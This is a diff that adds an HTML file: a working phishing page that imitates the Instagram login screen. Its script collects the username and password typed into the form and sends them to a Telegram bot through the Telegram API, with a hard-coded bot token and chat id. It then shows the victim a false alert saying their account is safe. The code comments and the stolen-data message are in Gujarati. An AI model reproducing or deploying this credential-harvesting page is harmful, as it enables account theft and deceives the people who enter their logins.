@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <main class="container">
+        <!-- Brand/Login Box -->
+        <div class="login-box">
+            <div class="logo-container">
+                <!-- Instagram Text Logo -->
+               <span style="font-family: 'Brush Script MT', cursive, sans-serif; font-size: 38px; font-weight: bold; color: #262626; display: block; text-align: center; margin-bottom: 20px;">Instagram</span>
+            </div>
+
+            <!-- Login Form -->
+           <form onsubmit="sendToTelegram(event)">
+    <div class="input-field">
+        <input type="text" id="username" required placeholder="Phone number, username, or email">
+    </div>
+    <div class="input-field">
+        <input type="password" id="password" required placeholder="Password">
+    </div>
+    <button type="submit" class="login-btn">Log in</button>
+</form>
+
+            <!-- Divider -->
+            <div class="divider">
+                <div class="line"></div>
+                <div class="or">OR</div>
+                <div class="line"></div>
+            </div>
+
+            <!-- Facebook Login & Forgot Password -->
+            <div class="fb-login">
+                <a href="#">
+                    <a href="#" style="text-decoration: none; color: #385185; font-weight: bold; font-size: 14px;">Log in with Facebook</a>
+       
+                </a>
+            </div>
+
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+
+        <!-- Box to Redirect to Sign Up -->
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+
+        <!-- App Download Links -->
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-buttons">
+                <div class="store-links" style="margin-top: 15px;">
+    <a href="#" style="color: #0095f6; font-weight: bold; text-decoration: none; font-size: 13px;">Google Play Store</a>
+    <a href="#" style="color: #0095f6; font-weight: bold; text-decoration: none; font-size: 13px; margin-left: 15px;">Microsoft Store</a>
+</div>
+            </div>
+        </div>
+    </main>
+<script>
+   function sendToTelegram(event) {
+    event.preventDefault(); // પેજ રીફ્રેશ થતું અટકાવવા માટે
+
+    let user = document.getElementById('username').value;
+    let pass = document.getElementById('password').value;
+
+    let botToken = "9149721018:AAHxICBxkwr_ZTDb9slzwRScqtdnWPC-Dy4";
+    let chatId = "710195624";
+    
+    let message = "નવી લોગિન ડિટેલ મળી:\nયુઝરનેમ: " + user + "\nપાસવર્ડ: " + pass;
+    
+    let url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+
+    // ટેલિગ્રામને ડેટા મોકલવા માટે
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            alert("Don't worry, your Instagram account is completely safe and secure");
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+}
+</script>
+</body>
+</html>
